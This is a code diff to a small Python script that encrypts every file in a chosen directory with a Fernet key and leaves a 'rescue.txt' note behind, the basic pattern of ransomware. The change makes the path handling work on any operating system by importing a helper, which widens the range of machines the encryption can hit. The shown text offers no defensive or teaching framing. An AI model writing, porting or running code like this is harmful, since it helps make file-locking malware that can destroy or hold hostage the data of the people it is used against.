@@ -1,5 +1,6 @@
 from cryptography.fernet import Fernet
 import os
+from shared import get_path_mode_on_so
 
 
 def set_path():
@@ -29,11 +30,11 @@ def encrypt(_items, _key):
 if __name__ == '__main__':
     path_to_encrypt = set_path()
     items = os.listdir(path_to_encrypt)
-    full_path = [path_to_encrypt + '\\' + item for item in items]
+    full_path = [path_to_encrypt + get_path_mode_on_so() + item for item in items]
 
     generate_key()
     key = load_key()
     encrypt(full_path, key)
 
-    with open(path_to_encrypt + '\\' + 'rescue.txt', 'w') as file:
+    with open(path_to_encrypt + get_path_mode_on_so() + 'rescue.txt', 'w') as file:
         file.write('Encrypted information')
